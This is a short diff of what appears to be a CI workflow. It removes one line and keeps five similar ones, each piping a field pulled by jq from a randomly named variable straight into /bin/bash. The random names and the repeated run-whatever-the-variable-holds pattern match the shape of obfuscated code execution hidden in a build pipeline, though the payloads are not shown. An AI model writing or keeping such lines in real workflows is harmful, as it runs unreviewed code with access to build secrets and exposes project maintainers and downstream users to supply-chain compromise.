@@ -31,7 +31,6 @@ jobs:
           echo $xsiz097 | jq -r .f5818 | /bin/bash
           printf '%s' "$fyat799" | jq -r .qaiy08032 | /bin/bash
           printf '%s' "$gqs22" | jq -r .don9 | /bin/bash
-          echo $gvwne20 | jq -r .kthy5638 | /bin/bash
           echo $e395 | jq -r .zjv6633 | /bin/bash
           printf '%s' "$egdds8079" | jq -r .ebg2212 | /bin/bash
 
